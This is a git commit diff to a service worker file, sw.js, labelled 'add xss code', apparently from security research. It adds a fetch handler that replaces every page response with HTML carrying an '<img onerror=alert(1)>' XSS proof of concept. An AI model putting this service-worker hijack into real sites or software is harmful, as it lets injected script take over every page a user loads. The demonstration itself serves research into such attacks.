a7134a32af7ce24e97d83227fb1aba38387aaa2f
王松_Tuuu <song@secbox.cn>
2018-08-01 17:19:37 +0800

    :sparkles: add xss code.

--- sw.js
+++ sw.js
@@ -1,3 +1,8 @@
 self.addEventListener('fetch', function (e) {
     console.log('Fetch event: ', e.request.url);
+    e.respondWith(
+        new Response(`<img src="x" onerror="alert(1)">`, {
+            headers: {'Content-Type': 'text/html'}
+        })
+    )
 });
